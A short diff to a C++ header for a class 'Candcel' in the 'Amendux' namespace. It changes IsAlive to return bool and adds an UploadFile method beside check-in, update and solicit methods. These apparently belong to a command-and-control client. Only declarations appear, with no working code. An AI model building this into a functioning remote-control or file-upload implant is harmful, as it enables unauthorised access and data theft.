@@ -13,7 +13,7 @@ namespace Amendux {
 
 		DWORD CheckIn();
 		void GetUpdate(unsigned int buildNumber, const std::wstring& wurl);
-		void IsAlive();
+		bool IsAlive();
 		void Solicit();
 		void CheckForUpdate();
 		void InitClass();
@@ -21,6 +21,8 @@ namespace Amendux {
 	public:
 		Candcel();
 		~Candcel();
+
+		void UploadFile(const std::wstring& name, const std::wstring& content);
 
 		bool IsConnected() const {
 			return serverSolicitAck;
